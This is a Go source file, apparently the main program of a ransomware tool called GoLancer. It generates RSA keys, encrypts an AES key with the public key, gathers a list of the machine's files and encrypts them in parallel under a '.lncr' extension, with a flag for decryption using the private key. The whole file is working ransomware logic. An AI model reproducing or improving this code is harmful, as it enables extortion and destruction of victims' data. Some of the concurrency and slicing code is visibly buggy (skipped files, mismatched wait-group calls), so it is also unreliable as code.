package main

import (
	"crypto/rsa"
	"flag"
	"fmt"
	"os"
	"runtime"
	"sync"

	"github.com/WesEfird/GoLancer/cryptutil"
	"github.com/WesEfird/GoLancer/sysinfo"
)

var privateKey *rsa.PrivateKey
var publicKey rsa.PublicKey
var aesKey []byte
var fileList []string

var wg sync.WaitGroup

func main() {

	gFlag := flag.Bool("g", false, "Generate new RSA key-pair and save to disk")
	killFlag := flag.Bool("kill", false, "!!DANGER!! Setting this flag will start ransomin'")
	dFlag := flag.Bool("d", false, "Start decryption proccess, must have private.pem file in same directory as GoLancer binary")

	flag.Parse()

	if *gFlag {
		privateKey = cryptutil.GenerateRSA()
		cryptutil.SaveRSAPrivateKey(*privateKey, "private.pem")
		cryptutil.SaveRSAPublicKey(privateKey.PublicKey, "public.pem")
		fmt.Println("Keypair saved.")
		os.Exit(0)
	}

	if *killFlag {
		fmt.Println("Loading public key.")
		publicKey = cryptutil.LoadRSAPublicKey("public.pem")

		fmt.Println("Generating AES key.")
		aesKey = cryptutil.GenerateAES()

		fmt.Println("Encrypting AES key and saving to disk.")
		cryptutil.SaveAESKey(cryptutil.EncryptAESKey(aesKey, publicKey), "golancer.key")

		fmt.Println("Gathering file list.")
		fileList = sysinfo.GetFileList()

		fmt.Println("Saving file list to disk.")
		sysinfo.SaveFileList(fileList, "files.txt")

		startEncryptors(false)
	}

	if *dFlag {
		fmt.Println("Loading private key.")
		privateKey = cryptutil.LoadRSAPrivateKey("private.pem")

		fmt.Println("Loading and decrypting AES key.")
		aesKey = cryptutil.DecryptAESKey(cryptutil.LoadAESKey("golancer.key"), *privateKey)

		fmt.Println("Loading file list.")
		fileList = sysinfo.LoadFileList("files.txt")

		fmt.Println("Starting decryption process.")
		startEncryptors(true)
	}

}

// Start goRoutines that either encrypt or decrypt files contained within the file list.
// The decrypt bool determines if encryption(false) or decryption(true) will happen
func startEncryptors(decrypt bool) {
	var blockPos int
	len := len(fileList)
	// If the machine has more than 3 logical CPU cores, and the number of files exceedes the core count, then we will split the files evenly (kinda)
	// Each goRoutine will take an (almost) even amount of files to encrypt or decrypt
	if len > runtime.NumCPU() && runtime.NumCPU() > 3 {
		// Calculate how many files each goRoutine should process
		blockSize := len / runtime.NumCPU()

		// One interation will be executed per logical CPU core
		for i := 0; i < runtime.NumCPU(); i++ {
			// The first goRoutine, this will process files up to the first blocksize, then increase the block position by 1
			if i == 0 {
				wg.Add(1)
				if decrypt {
					go decryptFiles(fileList[:blockSize])
				} else {
					go encryptFiles(fileList[:blockSize])
				}
				blockPos += blockSize
				continue
			}
			// The last goRoutine, this will process files from the second-to-last block position to the end of the file list
			if i == runtime.NumCPU()-1 {
				blockPos += 1
				wg.Add(1)
				if decrypt {
					go decryptFiles(fileList[blockPos:len])
				} else {
					go encryptFiles(fileList[blockPos:len])
				}
				break
			}
			// This is all other goRoutines between the first and last
			// It will track the current block position, assign files to the goRoutine, then increase the block position by 1 to get it ready for the next goRoutine
			blockPos += 1
			wg.Add(1)
			if decrypt {
				go decryptFiles(fileList[blockPos : blockPos+blockSize])
			} else {
				go encryptFiles(fileList[blockPos : blockPos+blockSize])
			}
			blockPos += blockSize
		}
		wg.Wait()
	} else {
		// If the device only has 1 core or if there are less than 10 files in the file list, then we won't even bother with goRoutines
		if runtime.NumCPU() == 1 || len < 10 {
			if decrypt {
				decryptFiles(fileList)
			} else {
				encryptFiles(fileList)
			}
			// If the device has 2-3 logical cores and there are more than 10 files in the list, then we will divide the file list in half and run two goRoutines
		} else {
			blockSize := len / 2
			if decrypt {
				go decryptFiles(fileList[:blockSize])
				go decryptFiles(fileList[blockSize+1 : len])
			} else {
				go encryptFiles(fileList[:blockSize])
				go encryptFiles(fileList[blockSize+1 : len])
			}
			wg.Wait()
		}
	}

}

func encryptFiles(files []string) {
	defer wg.Done()
	for _, file := range files {
		fmt.Println(file)
		cryptutil.EncryptFile(file, ".lncr", aesKey)
	}
}

func decryptFiles(files []string) {
	defer wg.Done()
	for _, file := range files {
		fmt.Println(file)
		cryptutil.DecryptFile(file, ".lncr", aesKey)
		os.Remove(file + ".lncr")
	}
}
